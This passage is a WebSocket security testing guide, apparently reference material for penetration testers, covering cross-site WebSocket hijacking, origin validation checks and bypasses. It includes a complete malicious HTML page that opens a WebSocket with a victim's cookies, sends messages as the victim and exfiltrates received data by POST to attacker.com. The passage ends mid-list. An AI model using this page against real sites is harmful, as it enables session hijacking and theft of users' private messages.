<websocket_hijacking_guide>
<title>WEBSOCKET SECURITY TESTING</title>

<critical>WebSocket connections create persistent, bidirectional channels that bypass traditional HTTP security controls. Focus on Cross-Site WebSocket Hijacking (CSWSH), message tampering, authentication bypass, origin validation, and request smuggling.</critical>

<scope>
- Cross-Site WebSocket Hijacking (CSWSH)
- Message tampering and injection attacks
- Authentication and session token theft
- Origin validation bypass techniques
- WebSocket to HTTP request smuggling
- Message replay attacks
- Connection hijacking and MitM
- Protocol confusion and upgrade attacks
</scope>

<methodology>
1. Identify WebSocket endpoints and handshake process
2. Test origin validation and CSRF protections
3. Analyze authentication mechanism (tokens, cookies, headers)
4. Intercept and manipulate WebSocket messages
5. Test for injection vulnerabilities in message handlers
6. Examine connection upgrade and protocol validation
7. Test rate limiting and resource exhaustion
</methodology>

<cswsh_attacks>
<concept>
{% raw %}
# Cross-Site WebSocket Hijacking (CSWSH)
# Similar to CSRF but for WebSocket connections

# Vulnerable pattern:
# 1. WebSocket uses cookies for authentication
# 2. No origin validation or weak validation
# 3. No CSRF token required for connection

# Attack flow:
# 1. Victim visits attacker's page
# 2. Page opens WebSocket to vulnerable app
# 3. Browser automatically sends authentication cookies
# 4. Attacker can send/receive messages as victim
{% endraw %}
</concept>

<detection>
{% raw %}
# Check if WebSocket authentication relies on cookies
# Inspect handshake request:

GET /ws/chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: https://example.com
Cookie: session_id=abc123; auth_token=xyz789

# If authentication is via cookies only -> Vulnerable to CSWSH
# If no Origin validation -> Exploitable

# Test with different origins:
Origin: https://attacker.com
Origin: null
Origin: https://example.com.attacker.com

# Burp Suite: Send WebSocket upgrade request with modified Origin
{% endraw %}
</detection>

<exploitation>
{% raw %}
# Create malicious HTML page

<!DOCTYPE html>
<html>
<head><title>CSWSH Attack</title></head>
<body>
<script>
// Victim's browser will send auth cookies automatically
var ws = new WebSocket('wss://vulnerable-app.com/ws/chat');

ws.onopen = function(event) {
    console.log('Connection opened');
    
    // Send messages as victim
    ws.send(JSON.stringify({
        type: 'message',
        content: 'Attacker controlled message',
        to: 'user123'
    }));
    
    // Exfiltrate data
    ws.send(JSON.stringify({
        type: 'get_messages',
        user_id: 'victim'
    }));
};

ws.onmessage = function(event) {
    console.log('Received:', event.data);
    
    // Exfiltrate to attacker server
    fetch('https://attacker.com/log', {
        method: 'POST',
        body: event.data
    });
};

ws.onerror = function(error) {
    console.log('WebSocket Error:', error);
};
</script>
</body>
</html>

# Host this page at https://attacker.com/cswsh.html
# When victim visits, WebSocket opens with their cookies
# Attacker can send/receive messages as victim
{% endraw %}
</exploitation>

<bypass_techniques>
{% raw %}
# Origin validation bypass

# Null origin (file://)
Origin: null

# Subdomain takeover
Origin: https://vulnerable-subdomain.example.com

# Domain confusion
